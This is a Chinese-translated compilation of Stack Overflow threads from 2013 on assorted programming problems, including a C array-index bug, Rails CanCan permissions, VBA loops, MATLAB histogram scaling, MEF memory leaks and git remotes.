该程序应该将用户的输入捕获到结构中，然后打印出给定信息的直方图。到目前为止一切正常，除了当我尝试打印直方图时，无论学生的成绩如何，所有“*”字符都属于 F 级。我认为正在发生的是传递学生的数组索引而不是实际变量本身，但我很困惑，因为在打印直方图之前的输出中它显示了正确的值。有什么建议么？

```
#include <stdio.h>
#include <stdlib.h>
#define MAXSIZE 28
#define MAXGRADE 100

struct studentData{
    char studentID[MAXSIZE];
    char studentName[MAXSIZE];
    int examPercent;
} studentRecords[MAXSIZE];

// function prototype for histogram
void displayHist(struct studentData *records, int classSize);

int main()
{
    int i, students = -1;
    //struct studentData *studentRecords[MAXSIZE];
    while(students < 0 || students > MAXSIZE)
    {
        printf("Please enter the number of students in your class:\n");
        scanf("%d", &students);

        if(students > MAXSIZE || students <= 0)
        {
            printf("Try again..\n");
            scanf("%d", &students);
        }

    }

 for(i=0;i<students;i++) {

        printf("Please enter the student #%d's lastname:\n", i+1);
        scanf("%s", &studentRecords[i].studentID);

        printf("Please enter the student #%d's ID#:\n", i+1);
        scanf("%s", &studentRecords[i].studentName);

        printf("Please enter the student's exam percent:\n");
        scanf("%d", &studentRecords[i].examPercent);

 }

 //This is just here to view the input...
 for(i=0;i<students;i++) {

        printf("Student #%d's name is %s\n", i+1, studentRecords[i].studentName);
        printf("student #%d's ID#:%s\n", i+1, studentRecords[i].studentID);
        printf("student #%d's grade was %d\n", i+1, studentRecords[i].examPercent);

  }

    displayHist(&studentRecords[students], students);

    return 0;
}

void displayHist(struct studentData *records, int classSize)
{
    int i;

       printf("A:");
    for(i=0;i<classSize;i++)
    {

        if(records[i].examPercent >=90)
        {
            printf("*");
        }

    }

       printf("\n");
       printf("B:");
    for(i=0;i<classSize;i++)
    {
        if(records[i].examPercent< 90 && records[i].examPercent >= 80)
        {
            printf("*");
        }
    }

       printf("\n");
       printf("C:");
     for(i=0;i<classSize;i++)
     {
        if(records[i].examPercent < 80 && records[i].examPercent >= 70)
        {
            printf("*");
        }

    }

   printf("\n");
   printf("D:");
   for(i=0;i<classSize;i++)
    {
        if(records[i].examPercent< 70 && records[i].examPercent >= 60)
        {
            printf("*");
        }

    }

   printf("\n");
   printf("F:");
   for(i=0;i<classSize;i++)
    {
        if(records[i].examPercent < 60)
        {
            printf("*");
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:41:44.737

```
displayHist(&studentRecords[students], students); 
```

`&studentRecords[students]`是数组之后的地址`studentRecords`。在 `displayHists`中，对 的访问`records[i]`将尝试取消引用`studentRecords[students+i]`，这超出了数组的范围。

正确的调用可能是：

```
displayHist(&studentRecords[0], students); 
```

这相当于：

```
displayHist(studentRecords, students); 
```

顺便说一句，不需要`&`在`scanf`with中使用`char *`，因为`char (*)[]`and`char *`可能有不同的内存表示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:20:15.717

```
scanf("%s", &studentRecords[i].studentID);

scanf("%s", &studentRecords[i].studentName);

warning: format ‘%s’ expects argument of type ‘char *’, but argument 2 has type ‘char (*)[28]’ [-Wformat] 
```

当您使用地址时，即`&`，它变为`char **`，这不是`scanf`预期的。

所以尝试使用这种方式。

```
scanf("%s", &(*studentRecords[i].studentID)); 
```

和

```
displayHist(studentRecords, students); 
```

# ruby-on-rails - 使用设计时如何保护用户显示页面以及用户管理功能

> ID：16110450
> 
> 赞同：1
> 
> 时间：2013-04-19T17:38:03.380
> 
> 标签：ruby-on-rails, devise, cancan

我正在使用设计并让管理员使用`Manage::UsersController`.

这是使用 cancan 锁定的：

```
# models/ability.rb    
def initialize(user)
  if user admin? 
   can :manage, User
  end
end 
```

普通用户只能通过设计与用户无关，因此一切看起来都很安全。

现在我想为用户提供一个“显示”页面来显示他们自己的帐户信息（而不是自定义设计“编辑”页面）。建议（[1](https://stackoverflow.com/a/7087112/1450420) , [2](https://stackoverflow.com/a/11222997/1450420) , [3](https://stackoverflow.com/a/4036045/1450420)）似乎是添加带有 show 方法的 users_controller 。

我试图让非管理员能够阅读他们自己的信息：

```
if user admin? 
  can :manage, User
else
  can :read, User, :id => user.id    # edited based on @Edwards's answer
end 
```

但是，这似乎并没有限制对 的访问`Manage::UsersController#index`，因此这意味着每个人都可以看到所有用户的列表。

实现这一目标的最简单方法是什么？我可以看到两个选项，（但我不确定是否正确）：

**1) 阻止用户访问`Manage::UsersController#index`**

```
def index
  @users = User.all
  authorize! :manage, User   # feels hackish because this is 'read' action
end 
```

**2) 覆盖设计控制器**

根据[这个答案](https://stackoverflow.com/a/4166214/1450420)，重写设计控制器可能是一个好方法，但问题是[哪个控制器](https://github.com/plataformatec/devise/tree/master/app/controllers/devise)（注册控制器？）以及如何。我对这条路线的担忧之一是我想要显示的信息与用户对象有关，但不是专门设计的（即用户计划信息等）。我也担心在尝试测试时会陷入困境。

你有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:28:33.903

我会将您的注册和身份验证保留为设计控制器；然后，创建您自己的不是设计控制器的用户控制器。

在您自己的控制器中，我们称其为 ProfilesController，您只能显示一个配置文件（current_user）的特定操作

路线

```
resource :profile 
```

配置文件控制器

```
class ProfilesController
  respond_to :html
  def show
    @user = current_user
  end

  def edit
    @user = current_user
  end

  def update
    @user = current_user
    @user.update_attributes(params[:user])
    respond_with @user
  end  
end 
```

由于它总是只编辑你，它限制了编辑或查看他人的能力。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:52:00.847

在你的`ability.rb`你有

```
 can :read, User, :user_id => user.id 
```

User 模型没有 user_id - 你希望登录的用户能够看到他们自己的帐户 - 也就是说它与 current_user 具有相同的 id。此外，`:read`是 的别名`[:index, :show]`，您只想要`:show`. 所以，

```
 can :show, User, :id => user.id 
```

应该做的工作。

# asp.net - 获取文件流的进度？

> ID：16110452
> 
> 赞同：0
> 
> 时间：2013-04-19T17:38:10.080
> 
> 标签：asp.net, vb.net, visual-studio-2010, vba, filestream

我正在建立一个网站，允许用户上传/下载/删除/管理数据库中的文件。

澄清一下，Web 应用程序将文件上传到数据库，而不是文件系统。这是因为服务器限制，我无法控制它。

我使用文件流将文件转换为 blob，然后将其粘贴到数据库中。我想知道的是：

是否可以获得大文件的文件流进度？查看到目前为止已经流式传输了多少或设置了一个计时器来更新该值？

我的代码如下：

```
Dim fs As Stream = upload1.PostedFile.InputStream
Dim br As New BinaryReader(fs)
Dim bytes as Byte() = br.ReadBytes(fs.Length)
Dim length As Integer = fs.Length 
```

然后我将“字节”作为参数添加到我的存储过程并运行查询。我可以添加什么来获取文件流的状态？

我希望这很清楚，如果不是我可以澄清。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:18:17.460

您可以使用这样的代码将一个流复制到另一个流，并在中间插入您的进度代码：

```
Public Shared Sub Copy(ByVal source As Stream, ByVal destination As Stream, ByVal bufferSize As Integer)
    Dim num As Integer
    Dim buffer As Byte() = New Byte(bufferSize  - 1) {}
    Do While (num = source.Read(buffer, 0, buffer.Length) <> 0)
        destination.Write(buffer, 0, num)
        ' insert progress code here
    Loop
End Sub 
```

# cocoa - 仅在 OSX 10.8.3 上打开沙盒可可应用程序窗口时出现奇怪的崩溃

> ID：16110453
> 
> 赞同：2
> 
> 时间：2013-04-19T17:38:13.140
> 
> 标签：cocoa, osx-mountain-lion, sandbox, crash-reports, ccl

这个很奇怪。我最近在我的开发机器上升级到了 Mountain Lion，现在每次我打开我的应用程序的主项目窗口时它都会崩溃。奇怪的是，它只发生在 10.8.3 上，而且只有在我对应用程序进行沙箱处理时才会发生。我有另一台运行 10.8.2（也是 Mountain Lion）的测试机器并且没有发生崩溃。此外，如果我在没有沙盒的情况下重新创建应用程序，它不会崩溃。这个应用程序实际上是用一个 common lisp 实现创建的，它使用一个名为 CCL 的可可桥。

以下是我在应用程序崩溃时在控制台中收到的一些报告：

```
4/19/13 11:30:15.605 AM AgentCubes[56676]: kCGErrorIllegalArgument: _getWindowRegion: Invalid window
4/19/13 11:30:15.606 AM AgentCubes[56676]: CGSSetWindowLevel: Invalid window 0x137c
4/19/13 11:30:15.607 AM AgentCubes[56676]: PSsetwindowlevel, error setting window level (1000)
4/19/13 11:30:15.607 AM AgentCubes[56676]: CGSClearWindowTags: Invalid window 0x137c
4/19/13 11:30:15.607 AM AgentCubes[56676]: CGSSetIgnoresCycle: error 1000 setting or clearing window tags
4/19/13 11:30:15.623 AM AgentCubes[56676]: *** Assertion failure in -[NativeScrollView scrollerImpPair:updateScrollerStyleForNewRecommendedScrollerStyle:], /SourceCache/AppKit/AppKit-1187.37/AppKit.subproj/NSScrollView.m:5402
4/19/13 11:30:15.623 AM AgentCubes[56676]: An uncaught exception was raised
4/19/13 11:30:15.624 AM AgentCubes[56676]: Invalid parameter not satisfying: scrollerImpPair == SCROLLER_IMP_PAIR 
```

和大痕迹：

```
4/19/13 11:30:15.626 AM AgentCubes[56676]: (
    0   CoreFoundation                      0x99cbee9b __raiseError + 219
    1   libobjc.A.dylib                     0x90a6552e objc_exception_throw + 230
    2   CoreFoundation                      0x99c1e6a8 +[NSException raise:format:arguments:] + 136
    3   Foundation                          0x93dfb814 -[NSAssertionHandler handleFailureInMethod:object:file:lineNumber:description:] + 116
    4   AppKit                              0x977cd7ab -[NSScrollView(NSPrivate) scrollerImpPair:updateScrollerStyleForNewRecommendedScrollerStyle:] + 150
    5   AppKit                              0x977cd6a5 +[NSScrollerImpPair _updateAllScrollerImpPairsForNewRecommendedScrollerStyle:] + 406
    6   AppKit                              0x977cd4ff +[NSScrollerImpPair _scrollerStyleRecommendationChanged:] + 159
    7   Foundation                          0x93e52152 __57-[NSNotificationCenter addObserver:selector:name:object:]_block_invoke_0 + 49
    8   CoreFoundation                      0x99c80861 ___CFXNotificationPost_block_invoke_0 + 257
    9   CoreFoundation                      0x99bcbe9a _CFXNotificationPost + 2794
    10  Foundation                          0x93e3ac88 -[NSNotificationCenter postNotificationName:object:userInfo:] + 92
    11  AppKit                              0x977cd3f5 -[_NSScrollerStyleRecommender setRecommendedScrollerStyleAndNotify:] + 248
    12  AppKit                              0x977cd2e3 __75-[_NSScrollerStyleRecommender scrollerStyleRecommendationUpdateTimerFired:]_block_invoke_0 + 43
    13  AppKit                              0x97eff42f __block_global_0 + 32
    14  libdispatch.dylib                   0x98f10f8f _dispatch_call_block_and_release + 15
    15  libdispatch.dylib                   0x98f0cc82 _dispatch_client_callout + 46
    16  libdispatch.dylib                   0x98f122e3 _dispatch_main_queue_callback_4CF + 223
    17  CoreFoundation                      0x99bbac39 __CFRunLoopRun + 1961
    18  CoreFoundation                      0x99bba02a CFRunLoopRunSpecific + 378
    19  CoreFoundation                      0x99bb9e9b CFRunLoopRunInMode + 123
    20  HIToolbox                           0x91e16f5a RunCurrentEventLoopInMode + 242
    21  HIToolbox                           0x91e16cc9 ReceiveNextEventCommon + 374
    22  HIToolbox                           0x91e16b44 BlockUntilNextEventMatchingListInMode + 88
    23  AppKit                              0x976e99aa _DPSNextEvent + 724
    24  AppKit                              0x976e91dc -[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 119
    25  AppKit                              0x976df63c -[NSApplication run] + 855
    26  AgentCubes                          0x0001991d ffcall_return + 0
    27  ???                                 0x003cbf9c 0x0 + 3981212
    28  ???                                 0x003cbf9c 0x0 + 3981212
    29  AgentCubes                          0x00019f79 func_start + 94
    30  AgentCubes                          0x0001c52e main + 1310
    31  AgentCubes                          0x00033fb4 _start + 207
    32  AgentCubes                          0x00033ee4 start + 40
) 
```

最后：

```
4/19/13 11:30:15.627 AM AgentCubes[56676]: *** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Invalid parameter not satisfying: scrollerImpPair == SCROLLER_IMP_PAIR'
*** Call stack at first throw:
(
    0   CoreFoundation                      0x99cbee9b __raiseError + 219
    1   libobjc.A.dylib                     0x90a6552e objc_exception_throw + 230
    2   CoreFoundation                      0x99c1e6a8 +[NSException raise:format:arguments:] + 136
    3   Foundation                          0x93dfb814 -[NSAssertionHandler handleFailureInMethod:object:file:lineNumber:description:] + 116
    4   AppKit                              0x977cd7ab -[NSScrollView(NSPrivate) scrollerImpPair:updateScrollerStyleForNewRecommendedScrollerStyle:] + 150
    5   AppKit                              0x977cd6a5 +[NSScrollerImpPair _updateAllScrollerImpPairsForNewRecommendedScrollerStyle:] + 406
    6   AppKit                              0x977cd4ff +[NSScrollerImpPair _scrollerStyleRecommendationChanged:] + 159
    7   Foundation                          0x93e52152 __57-[NSNotificationCenter addObserver:selector:name:object:]_block_invoke_0 + 49
    8   CoreFoundation                      0x99c80861 ___CFXNotificationPost_block_invoke_0 + 257
    9   CoreFoundation                      0x99bcbe9a _CFXNotificationPost + 2794
    10  Foundation                          0x93e3ac88 -[NSNotificationCenter postNotificationName:object:userInfo:] + 92
    11  AppKit                              0x977cd3f5 -[_NSScrollerStyleRecommender setRecommendedScrollerStyleAndNotify:] + 248
    12  AppKit                              0x977cd2e3 __75-[_NSScrollerStyleRecommender scrollerStyleRecommendationUpdateTimerFired:]_block_invoke_0 + 43
    13  AppKit                              0x97eff42f __block_global_0 + 32
    14  libdispatch.dylib                   0x98f10f8f _dispatch_call_block_and_release + 15
    15  libdispatch.dylib                   0x98f0cc82 _dispatch_client_callout + 46
    16  libdispatch.dylib                   0x98f122e3 _dispatch_main_queue_callback_4CF + 223
    17  CoreFoundation                      0x99bbac39 __CFRunLoopRun + 1961
    18  CoreFoundation                      0x99bba02a CFRunLoopRunSpecific + 378
    19  CoreFoundation                      0x99bb9e9b CFRunLoopRunInMode + 123
    20  HIToolbox                           0x91e16f5a RunCurrentEventLoopInMode + 242
    21  HIToolbox                           0x91e16cc9 ReceiveNextEventCommon + 374
    22  HIToolbox                           0x91e16b44 BlockUntilNextEventMatchingListInMode + 88
    23  AppKit                              0x976e99aa _DPSNextEvent + 724
    24  AppKit                              0x976e91dc -[NSApplication nextEventMatchingMask:untilDate:inMode:dequeue:] + 119
    25  AppKit                              0x976df63c -[NSApplication run] + 855
    26  AgentCubes                          0x0001991d ffcall_return + 0
    27  ???                                 0x003cbf9c 0x0 + 3981212
    28  ???                                 0x003cbf9c 0x0 + 3981212
    29  AgentCubes                          0x00019f79 func_start + 94
    30  AgentCubes                          0x0001c52e main + 1310
    31  AgentCubes                          0x00033fb4 _start + 207
    32  AgentCubes                          0x00033ee4 start + 40
) 
```

我对这一切感到非常困惑，我想知道 10.8.3 中与沙盒交互不好的地方会发生什么变化？

# objective-c - 将整数传递给方法

> ID：16110455
> 
> 赞同：-5
> 
> 时间：2013-04-19T17:38:18.520
> 
> 标签：objective-c

我正在尝试将 int 类型的简单整数传递给 void 方法，如下所示：

```
-(void)deleteGroup{ 
```

我知道我应该这样做：

```
[self deleteGroup withInt: 3]; 
```

但我似乎无法找出正确的解决方案

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-19T17:39:33.670

你需要改变

```
-(void)deleteGroupWithInteger:(NSInteger)intValue{ 
```

然后使用

```
[self deleteGroupWithInteger:3]; 
```

# django - django：从管理面板向用户发送邮件

> ID：16110460
> 
> 赞同：1
> 
> 时间：2013-04-19T17:38:28.647
> 
> 标签：django, django-forms, django-admin, django-admin-tools

我想知道如何配置 django admin 以查看表单，因此 auth_user 应该向订阅用户发送电子邮件。

我做了什么：

模型.py

```
from django.db import models
from datetime import datetime

class Mail(models.Model):
    email=models.EmailField(max_length=255,unique=True,help_text="Το email του χρήστη",verbose_name="Email")
    timestamp=models.DateTimeField(default=datetime.now,help_text="Η ημερομηνία που ο χρήστης γράφτηκε στην newsletter list",verbose_name="Ημερομηνία εγγραφής")
    delete_link=models.SlugField(unique=True,max_length=255,null=True,blank=True)
    def __unicode__(self):
        return self.email

    class Meta:
        verbose_name = "Email User"
        verbose_name_plural = "Email Users" 
```

表格.py

```
from django import forms

class MailForm(forms.Form):
        subject = forms.CharField(max_length=255)
        message = forms.CharField(widget=forms.Textarea)
        attachment = forms.FileField() 
```

我正在尝试在管理页面中添加一个指向时事通讯应用程序的链接。示例：

![在此处输入图像描述](https://i.stack.imgur.com/KLTni.png)

现在不知何故，我必须为表单编写验证规则（主题和消息不能为空）。对于验证，我正在尝试执行以下操作：

```
def clean_subject(self):
        if self.cleaned_data["subject"]=="" or self.cleaned_data["subject"]==None:
            raise forms.ValidationError("My text goes here")    
        return self.cleaned_data["subject"]

def clean_message(self):
        if self.cleaned_data["message"]=="" or self.cleaned_data["message"]==None:
            raise forms.ValidationError("My text goes here")    
        return self.cleaned_data["message"] 
```

当表单无效时，django 会显示一条类似标准方式的消息。示例：

![django 管理员错误验证](https://i.stack.imgur.com/varB8.png)

最后，我必须编写 1 个视图来显示表单（我正在尝试为 django admin 使用标准的东西，以及 1 个视图，其中显示“成功发送 130 封邮件”。

任何建议我如何配置 django admin 来执行我所描述的操作都会很有用！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-15T22:17:19.237

我认为您应该创建一个 Mail 模型。首先，您必须创建一个邮件并保存它。然后，您可以使用邮件模型的保存方法将其发送给您的所有电子邮件用户，或者添加自定义管理操作来执行此操作。在我看来，保存方法是最好的。

所以你应该在 models.py 中有这个：

```
from django.db import models
from datetime import datetime
from django.core.mail import send_mail

    class Mail(models.Model):
        ...

        class Meta:
            verbose_name = "Email User"
            verbose_name_plural = "Email Users"

    class MailText(models.Model):
        subject = models.Charfield()
        message = models.Charfield()
        attachment = models.Filefield()
        users = models.ManyToManyField(Mail)
        send_it = models.BooleanField(default=False) #check it if you want to send your email

        def save(self):
            if self.send_it:
                #First you create your list of users
                user_list = []
                for u in self.users:
                    user_list.append(u.email)

                #Then you can send the message. 
                send_mail(str(self.subject), 
                          str(self.message),
                          'from@example.com',
                          user_list, 
                          fail_silently=False)

        class Meta:
            verbose_name = "Emails to send"
            verbose_name_plural = "Emails to send" 
```

# java - 学习不同代码的最佳方法是什么？

> ID：16110462
> 
> 赞同：1
> 
> 时间：2013-04-19T17:38:36.667
> 
> 标签：java, php, javascript, html, css

我正在尝试大致掌握各种不同的语言。哪里是开始学习的好地方？我想学习php、java、html、css、javascript。

我去过 w3schools [http://www.w3schools.com](http://www.w3schools.com)

还有其他很棒的网站吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:43:24.610

您可以学习 Java 的一些网站是：

[mkyong](http://www.mkyong.com/)本身和[本](http://www.mkyong.com/featured/top-20-java-websites/)网站上提供的链接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:40:25.143

我肯定会尝试 Codecademy [http://www.codecademy.com](http://www.codecademy.com)。它是免费的，他们有很好的例子，你可以通过。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T17:41:29.627

看书！Indigo 有很多与计算机相关的书籍。我认为它们很好，因为它带有示例并且解释得很好

# excel - Excel VBA Next 没有 For

> ID：16110467
> 
> 赞同：1
> 
> 时间：2013-04-19T17:39:07.570
> 
> 标签：excel, vba

新语言的语法可能很难掌握。我是 VBA excel 的 1 天大，想知道下面哪里出错了。

尝试为用户选择的单元格中的行着色

```
Sub color()
    Dim R As Range
    Dim I As Integer
    Dim P As Object
    I = 1
    R = Selection
    For Each P In R
        If I Mod 2 = 0 Then
             P.Interior.ColorIndex = 36
        Else
            P.Interior.ColorIndex = 40
        I = I + 1
    Next P
End Sub 
```

我得到的错误是 Next without for

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T02:47:16.397

Siddarth，他的问题是“我得到的错误是 Next without for”。我通过添加“End IF”纠正了错误。无论如何，这是正确的代码：---

```
Sub color()
  Dim R As Range
  Dim I As Integer
    Dim P As Object
  I = 1
  'R = ActiveWindow.Selection
  For Each P In ActiveWindow.Selection
      If I Mod 2 = 0 Then
           P.Interior.ColorIndex = 36
      Else
          P.Interior.ColorIndex = 40
      End If
      I = I + 1
    Next P
 End Sub 
```

第 6 行和第 7 行也可以更改如下：

```
 Set R = ActiveWindow.Selection
  For Each P In R 
```

# matlab - 直方图中的 Matlab 绘图

> ID：16110469
> 
> 赞同：0
> 
> 时间：2013-04-19T17:39:18.027
> 
> 标签：matlab, statistics

假设`y`是一个随机数服从分布的向量`f(x)=sqrt(4-x^2)/(2*pi)`。目前我使用命令`hist(y,30)`。如何将分布函数绘制`f(x)=sqrt(4-x^2)/(2*pi)`到相同的直方图中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:30:07.907

让我们以另一个分布函数为例，即标准正态分布。要完全按照您所说的去做，请执行以下操作：

```
nRand = 10000;
y = randn(1,nRand);
[myHist, bins] = hist(y,30);
pdf = normpdf(bins);
figure, bar(bins, myHist,1); hold on; plot(bins,pdf,'rx-'); hold off; 
```

不过，这可能不是您真正想要的。为什么？您会注意到您的密度函数在直方图底部看起来像一条细线。这是因为直方图是 bin 中数字的计数，而密度函数被归一化以积分为 1。如果您在一个 bin 中有数百个项目，则密度函数无法在比例上匹配它，因此您会遇到缩放或归一化问题。要么你必须标准化直方图，要么绘制一个缩放分布函数。我更喜欢缩放分布函数，以便在查看直方图时我的计数是有意义的：

```
normalizedpdf = pdf/sum(pdf)*sum(myHist);
figure, bar(bins, myHist,1); hold on; plot(bins,normalizedpdf,'rx-'); hold off; 
```

你的情况是一样的，除了你将使用你指定的函数 f(x) 而不是 normpdf 命令。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T19:11:45.163

您也可以通过找到如下的理论比例因子来进行数值归一化，而不是进行数值归一化。

```
nbins = 30;
nsamples = max(size(y));
binsize = (max(y)-min(y)) / nsamples
hist(y,nbins)
hold on
x1=linspace(min(y),max(y),100);
scalefactor = nsamples * binsize 
y1=scalefactor * sqrt(4-x^2)/(2*pi)
plot(x1,y1) 
```

更新： **它是如何工作的。**

对于任何大到足以对 pdf 提供良好近似的数据集（称为 f(x)），f(x) 在该域上的积分将近似为一。但是我们知道，*任何*直方图下的面积都恰好等于样本总数乘以 bin-width。

因此，使 pdf 与直方图一致的一个非常简单的比例因子是 Ns*Wb，即样本点的总数乘以 bin 的宽度。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T19:23:49.247

让我再添加一个例子：

```
%# some normally distributed random data
data = randn(1e3,1);

%# histogram
numbins = 30;
hist(data, numbins);
h(1) = get(gca,'Children');
set(h(1), 'FaceColor',[.8 .8 1])

%# figure out how to scale the pdf (with area = 1), to the area of the histogram
[bincounts,binpos] = hist(data, numbins);
binwidth = binpos(2) - binpos(1);
histarea = binwidth*sum(bincounts);

%# fit a gaussian
[muhat,sigmahat] = normfit(data);
x = linspace(binpos(1),binpos(end),100);
y = normpdf(x, muhat, sigmahat);
h(2) = line(x, y*histarea, 'Color','b', 'LineWidth',2);

%# kernel estimator
[f,x,u] = ksdensity( data );
h(3) = line(x, f*histarea, 'Color','r', 'LineWidth',2);

legend(h, {'freq hist','fitted Gaussian','kernel estimator'}) 
```

![历史](https://i.stack.imgur.com/73crg.png)

# .net - 从区域中删除视图时内存泄漏

> ID：16110471
> 
> 赞同：2
> 
> 时间：2013-04-19T17:39:22.850
> 
> 标签：.net, wpf, mvvm, prism, mef

我创建了可以使用 PRISM MEF 选择区域内不同游戏的游戏管理器。“MainRegion”中有静态外壳和动态内容。每个游戏都是独立的模块（组件），当我获得实例时，它为每个游戏分配了大约 20-30 MB。

每个游戏我都有这样的组件：

*   主视图 [CreationPolicy.Shared]
    *   View1 [CreationPolicy.Shared]
    *   ViewN [CreationPolicy.Shared]

*   MainViewModel [CreationPolicy.Shared]
    *   ViewModel1 [CreationPolicy.Shared]
    *   ViewModelN [CreationPolicy.Shared]

通过调用创建的每个“视图”（main、1st、2nd ...）

```
_serviceLocator.GetInstance<MainView>(); 
```

每个“视图”具有以下属性

```
[Import(AllowRecomposition = false)]
public MainViewModel ViewModel //example for MainView
{
    get { return this.DataContext as MainViewModel; }
    set { this.DataContext = value; }
} 
```

当我想更改游戏时，我从中删除`MainView`，`MainRegion`但它不会创建新实例，因为`PartCreationPolicy`设置为`Shared`，但如果我使用`NonShared`它，则在删除实例后会出现内存泄漏。

如何在我的应用程序中修复此内存泄漏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-19T20:42:47.083

解决泄漏的关键是首先通过使用内存分析器来理解它，并确定对象被保存在内存中的原因以及哪个对象持有对它们的引用。

由于您没有在您的问题中提供此类信息，我会指出这种泄漏的一个非常可能的原因是您的对象实现了`IDisposable`. MEF 保留对一次性对象的引用而不释放它们存在一个已知问题。如果确实如此，您可以查看此问题以获取更多详细信息和可能的解决方案：[MEF 保留对 NonShared IDisposable 部件的引用，不允许它们被 GC 收集](https://stackoverflow.com/q/8787982/389966)。另一种可能性是您的一个导入配置为允许重组 - 在这种情况下，MEF 还将保留对您的对象的引用。

您还应该记住，GC 仅在需要时执行垃圾收集，而不一定在您删除实例后立即执行。您可以自己调用垃圾收集器以确保对象确实保存在内存中：

```
GC.Collect();
GC.WaitForPendingFinalizers();
GC.Collect(); 
```

如果您的对象不是一次性的并且没有允许重组的导入，那么对它们的引用很可能由您自己的代码保存，并且您必须分析您的应用程序以找出由谁来。为此，我建议使用[ANTS Memory Profiler](http://www.red-gate.com/products/dotnet-development/ants-memory-profiler/)。

# c# - 报表查看器文本框可见性表达式

> ID：16110474
> 
> 赞同：4
> 
> 时间：2013-04-19T17:39:34.943
> 
> 标签：c#, vb.net, report-viewer2010

我正在尝试获取一个文本框和 tablix 来根据表达式切换它们的可见性。

我尝试了以下方法：

```
=IIF(First(Fields!Supported.Value, "FooDataSet") = "true", True, False) 
```

但是，这对我不起作用。我正在使用 2010 版本并在本地模式下使用它。

我还尝试编写自定义代码以查看是否可行：

```
Public Function ToggleVisibility(ByVal visible As string) As Boolean
  Dim isVisible As Boolean = False
  If visible = "true" Then
    isVisible = True
  End If
  Return isVisible
End Function 
```

然后我在文本框和tablix属性的Visibility项下的“Show or hide based on an expression”中使用它。

```
=Code.ToggleVisiblity(First(Fields!Supported.Value, "FooDataSet")) 
```

这对我也不起作用。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-19T18:19:03.503

我看到了一个文本框的可见性并且它起作用了。

我做了以下

1.  右键单击文本框控件
2.  单击文本框属性... => 可见性
3.  根据表达式选择显示或隐藏并单击 fx 按钮
4.  在表达式编辑器中，我添加了以下代码。

> =IIF(First(Fields!Author.Value, "DataSet1")="Romulus",true,false)

**请注意，在此编辑器中，您正在为Hidden**而不是**Visibility**设置表达式，因此在传递值时要小心。就我而言，由于 Romulus 不是作者，因此条件被评估为**false**并且文本框**可见**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-03T11:33:33.543

即使没有它也应该工作`IIF`。

```
=First(Fields!Supported.Value, "FooDataSet") = "true" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-08-02T13:35:15.160

我为此浪费了一个小时，

问题是如果您的 EXP 值为 TRUE，它只是隐藏报告项，如果 exp 值为 false 则显示它......这令人沮丧

# json - Chrome 说 manifest.json 不在 utf8 中

> ID：16110476
> 
> 赞同：0
> 
> 时间：2013-04-19T17:39:55.100
> 
> 标签：json, google-chrome, google-chrome-extension

我确定我尝试过使用/不使用 BOM，但我仍然收到此错误： ![UT8 Chrome 扩展错误](https://i.stack.imgur.com/34bez.jpg)

```
{
  "manifest_version": 2,

  "default_locale": "en",

  "name":           "__MSG_ext_name__",
  "description":    "__MSG_ext_description__",
  "version":        "1.6.0",

  "icons": {
    "16":  "icon_16.png",
    "48":  "icon_48.png",
    "128": "icon_128.png"
  },

  "browser_action": {
    "default_icon":  "icon_19.png",
    "default_popup": "popup.html"
  },

  "background": {
    "page": "background.html"
  },

  "options_page": "options.html",

  "permissions": [
    "tabs"
  ],

  "content_scripts": [
    {
      "matches": [
        "http://*/*",
        "https://*/*"
      ],
      "js": [
        "scripts/content.js"
      ],
      "run_at": "document_start",
      "all_frames": true
    }
  ]
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T10:32:17.363

我使用了一个程序[将我所有的文件批量转换为 UTF-8](https://www.google.fr/search?newwindow=1&safe=off&q=mass%20convert%20utf%208)，现在它可以工作了，我认为正如方觉所说，问题出在清单之外的另一个文件上。

# git - 将本地仓库与 Github 项目合并

> ID：16110477
> 
> 赞同：3
> 
> 时间：2013-04-19T17:39:58.367
> 
> 标签：git, github, repository, upgrade

我有一个本地 github 存储库，它是 Github 上一个开源项目的旧版本。我需要在 github 上使用新版本升级我的本地存储库，但我不知道从哪里开始。

我看到了一个使用命令“git remote add {name} {URL of github repository}”的示例。这个对吗？我是否将字段 {name} 替换为我的本地存储库？

任何建议将不胜感激。

我是 github 的新手，我不想破坏我的本地存储库，所以我希望有经验的人可以提供一些建议。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T21:29:15.707

1.  添加远程存储库（我在`upstream`这里调用它，你可以调用它）：

    ```
    git remote add upstream {URL of github repository} 
    ```

2.  `upstream`从远程仓库获取所有提交、分支、标签等。这是一个安全的命令，不会破坏您本地仓库的历史记录或工作树。

    ```
    git fetch upstream 
    ```

3.  您可以运行`git log upstream/BRANCH_NAME`或`git log upstream/TAG_NAME`查看给定`BRANCH_NAME`或`TAG_NAME`远程的提交列表`upstream`。事实上，对于任何 git 命令，如果您想引用 remote 中存在的分支`upstream`，请使用`upstream/<BRANCH_NAME>`语法。对于标签，`tags/TAG_NAME`应该足够了。

4.  如果您想将这些标签或分支中的更改合并或变基到您的本地存储库中，您可以使用`merge`and`rebase`命令执行此操作。如果您需要有关这些命令的更多帮助，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:05:17.550

对，那是正确的

```
